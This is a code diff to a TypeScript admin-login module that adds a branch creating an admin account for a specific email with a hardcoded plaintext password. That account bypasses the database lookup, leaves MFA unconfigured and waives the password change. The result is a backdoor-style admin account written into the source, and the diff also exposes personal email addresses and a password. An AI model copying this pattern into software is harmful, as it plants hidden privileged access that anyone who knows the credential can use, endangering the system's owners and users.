@@ -9,13 +9,15 @@ const TMP_USER_FILE = path.join(os.tmpdir(), "admin-user.json");
 
 let inMemoryUser: AdminUser | null = null;
 
-export async function getAdminUser(): Promise<AdminUser> {
+export async function getAdminUser(targetEmail?: string): Promise<AdminUser> {
+  const emailToFind = (targetEmail || "magc2204@gmail.com").trim().toLowerCase();
+
   // 1. Intentar consultar Supabase
   try {
     const { data, error } = await supabase
       .from("admin_users")
       .select("*")
-      .eq("email", "magc2204@gmail.com")
+      .eq("email", emailToFind)
       .single();
 
     if (!error && data) {
@@ -32,6 +34,20 @@ export async function getAdminUser(): Promise<AdminUser> {
     }
   } catch {
     // Si la tabla no está creada aún, caer a archivo local / tmp
+  }
+
+  if (emailToFind === "kanan.gdl@gmail.com") {
+    const { hash, salt } = await hashPassword("KananGdl2026@");
+    const kananUser: AdminUser = {
+      email: "kanan.gdl@gmail.com",
+      passwordHash: hash,
+      salt,
+      mfaSecret: generateMfaSecret(),
+      mfaConfigured: false,
+      mustChangePassword: false,
+    };
+    await saveAdminUser(kananUser);
+    return kananUser;
   }
 
   // 2. Revisar si existe en local
